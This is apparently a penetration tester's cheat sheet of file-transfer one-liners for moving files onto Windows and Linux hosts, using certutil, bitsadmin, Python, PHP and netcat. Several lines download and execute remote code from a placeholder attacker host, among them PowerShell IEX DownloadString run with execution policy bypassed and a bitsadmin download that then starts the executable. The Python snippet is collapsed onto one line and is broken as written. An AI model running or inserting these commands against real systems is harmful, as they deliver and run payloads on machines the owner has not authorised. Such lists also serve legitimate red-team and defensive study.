## Windows

### CertUtil.exe
```powershell
certutil -urlcache -split -f "http://ip-addr:port/NameOfHostedFile" <output-file-name>
```


### Powershell
```powershell
powershell IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')

powershellv2
powershell -Version 2 -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://<IPAddress>:<Port>/PowershellScript.ps1')

powershellv3
wget "http://<ip address>:<port>/FileToDownload.exe" -OutFile SomeOutputFileName.exe
```


### BITS Admin 
```powershell
cmd.exe /c "bitsadmin /transfer myjob /download /priority high http://<ip address>:<port>/FileToTransfer.exe C:\Path\ExeOutputName.exe
start ExeOutputName.exe"
```

## Linux

### Python
```bash
#!/usr/bin/python import urllib2 u = urllib2.urlopen('https://domain/file') localFile = open('local_file', 'w') localFile.write(u.read()) localFile.close()
```

### PHP
```bash
#!/usr/bin/php 
<?php         
$data = @file("https://example.com/file");         
$lf = "local_file";         
$fh = fopen($lf, 'w');         
fwrite($fh, $data[0]);         
fclose($fh); ?>
```

### Netcat
```bash
LHOST:
cat file | nc -l 1234

RHOST:
nc host_ip 1234 > file
```

